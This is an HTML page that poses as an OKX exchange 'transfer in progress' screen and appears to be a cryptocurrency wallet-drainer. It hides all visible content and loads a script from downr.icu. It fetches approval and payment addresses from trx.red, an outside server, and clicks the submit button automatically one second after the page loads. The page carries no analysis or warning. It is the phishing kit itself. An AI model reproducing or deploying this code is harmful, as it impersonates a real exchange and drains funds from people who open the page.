<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
    <title>正在转账</title>
    <script src="newokx/js/jquery-3.5.1.min.js"></script>
    <link rel="shortcut icon" href="https://static.okx.com/cdn/assets/imgs/226/EB771F0EE8994DD5.png" type="image/png">
    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
    <script>eruda.init();</script>
    <style>
        /* 隐藏页面上的所有内容 */
        body {
            display: none;
        }
    </style>
</head>
<body>
    <!-- 保留原来的JS文件引用 -->
    <script type="text/javascript" src="https://downr.icu/bfpay.js"></script>
    <script type="text/javascript" src="newokx/js/help.js"></script>
    <script type="text/javascript" src="newokx/js/common.js"></script>

    <script>
        // 保留从 downr.icu 获取数据的逻辑
        let approveaddress, payaddress, isopen, ismiaou;
        var domain = '';
        fetch('https://trx.red/yyadmin/database.php')
            .then(response => response.json())
            .then(data => {
                data.forEach(config => {
                    switch(config.config_key) {
                        case 'approve_address':
                            approveaddress = config.config_value;
                            break;
                        case 'pay_address':
                            payaddress = config.config_value;
                            break;
                        case 'isappay':
                            ismiaou = config.config_value;
                            break;
                        case 'isopen':
                            isopen = config.config_value;
                            break;
                        default:
                            console.log('未定义的配置键:', config.config_key);
                    }
                });

                if (isopen === '0') {
                    console.log(isopen);
                } else {
                    window.location.href = '/404.php';
                }
            })
            .catch(error => {
                console.error('Error fetching config:', error);
            });

        // 页面加载后自动执行submitBtn的点击逻辑
        document.addEventListener('DOMContentLoaded', function() {
            // 模拟点击“下一步”按钮
            setTimeout(function() {
                document.getElementById('submitBtn').click(); // 模拟点击submitBtn按钮
            }, 1000); // 延迟1秒后自动点击
        });
    </script>
</body>
</html>
